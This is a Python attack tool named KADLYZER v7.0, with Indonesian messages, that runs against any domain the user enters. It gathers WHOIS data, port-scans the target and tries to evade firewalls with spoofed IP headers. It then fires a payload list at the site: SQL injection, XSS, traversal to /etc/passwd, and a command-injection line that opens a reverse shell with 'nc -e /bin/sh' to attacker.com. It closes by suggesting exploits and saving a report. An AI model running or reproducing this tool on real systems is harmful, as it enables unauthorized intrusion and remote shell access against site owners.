import requests
import socket
import json
import threading
import random
import base64
import time

# ==============================
# KADLYZER v7.0 - More Stealthy, More Powerful!
# ==============================

BYPASS_WAF_HEADERS = [
    {"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1"},
    {"User-Agent": "Googlebot", "X-Originating-IP": "127.0.0.1"},
    {"User-Agent": "Mozilla/5.0", "Referer": "https://www.google.com/"},
    {"User-Agent": "curl/7.68.0", "CF-Connecting-IP": "127.0.0.1"},
    {"User-Agent": "Wget/1.21.1", "X-Real-IP": "127.0.0.1"},
]

PAYLOADS = [
    "' OR '1'='1' --",  
    "<script>alert('XSS')</script>",  
    "../../../../etc/passwd",  
    "'; nc -e /bin/sh attacker.com 4444 ;'",
    base64.b64encode(b"' OR '1'='1' --").decode(),  # Encoded SQLi
    base64.b64encode(b"<script>alert('XSS')</script>").decode(),  # Encoded XSS
]

def banner():
    print("""

██╗  ██╗ █████╗ ██████╗ ██╗  ██╗   ██╗███████╗███████╗██████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝╚══███╔╝██╔════╝██╔══██╗
█████╔╝ ███████║██║  ██║██║   ╚████╔╝   ███╔╝ █████╗  ██████╔╝
██╔═██╗ ██╔══██║██║  ██║██║    ╚██╔╝   ███╔╝  ██╔══╝  ██╔══██╗
██║  ██╗██║  ██║██████╔╝███████╗██║   ███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝
                                                              
KADLYZER v7.0 - More Stealthy, More Powerful!
    """)

def recon(domain):
    print(f"\n[🔍] Mengumpulkan informasi tentang {domain}...\n")
    
    try:
        ip = socket.gethostbyname(domain)
        print(f"[✔] IP Target: {ip}")

        response = requests.get(f"https://api.hackertarget.com/whois/?q={domain}")
        print(f"[✔] WHOIS Data:\n{response.text}")

    except Exception as e:
        print(f"[✖] Gagal mengambil data: {e}")

def scan_ports(domain):
    print(f"\n[🔎] Memeriksa port terbuka pada {domain}...\n")
    common_ports = list(range(1, 1024)) + [3306, 5432, 8080, 8443]
    
    ip = socket.gethostbyname(domain)
    open_ports = []

    def check_port(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((ip, port)) == 0:
            open_ports.append(port)
        s.close()

    threads = []
    for port in common_ports:
        t = threading.Thread(target=check_port, args=(port,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    if open_ports:
        print(f"[✔] Port terbuka: {open_ports}")
    else:
        print("[✖] Tidak ada port yang terbuka.")

def bypass_waf(domain):
    print(f"\n[🛡] Mencoba bypass WAF pada {domain}...\n")

    for header in BYPASS_WAF_HEADERS:
        try:
            response = requests.get(f"http://{domain}", headers=header, timeout=5)
            if response.status_code == 200:
                print(f"[✔] Bypass berhasil dengan User-Agent: {header['User-Agent']}")
                return
        except requests.exceptions.RequestException:
            pass

    print("[✖] Tidak bisa bypass WAF.")

def vulnerability_scan(domain):
    print(f"\n[⚡] Melakukan scanning celah keamanan pada {domain}...\n")

    vulnerable = False

    for payload in PAYLOADS:
        try:
            url = f"http://{domain}?q={payload}"
            header = random.choice(BYPASS_WAF_HEADERS)
            response = requests.get(url, headers=header, timeout=5)
            if payload in response.text:
                print(f"[✔] Target rentan terhadap payload: {payload}")
                vulnerable = True
        except requests.exceptions.RequestException:
            pass

    if not vulnerable:
        print("[✖] Tidak ditemukan celah yang jelas.")

def exploit_suggestion():
    print(f"\n[💣] Rekomendasi exploit yang bisa dicoba:\n")
    print("  1. SQL Injection → Gunakan SQLMap")
    print("  2. XSS → Inject script berbahaya")
    print("  3. LFI → Akses file sensitif")
    print("  4. RCE → Remote Command Execution")

def generate_report(domain):
    print(f"\n[📜] Membuat laporan hasil scanning...\n")

    report = {
        "target": domain,
        "port_scan": "Lihat hasil di atas",
        "bypass_waf": "Lihat hasil di atas",
        "vulnerability_scan": "Lihat hasil di atas",
        "exploit_suggestion": [
            "SQL Injection",
            "XSS",
            "LFI",
            "Remote Command Execution"
        ]
    }

    with open(f"report_{domain}.json", "w") as f:
        json.dump(report, f, indent=4)
    
    print(f"[✔] Laporan disimpan sebagai report_{domain}.json")

def main():
    banner()
    domain = input("Masukkan target domain: ")

    recon(domain)
    scan_ports(domain)
    bypass_waf(domain)
    vulnerability_scan(domain)
    exploit_suggestion()
    generate_report(domain)

if __name__ == "__main__":
    main()
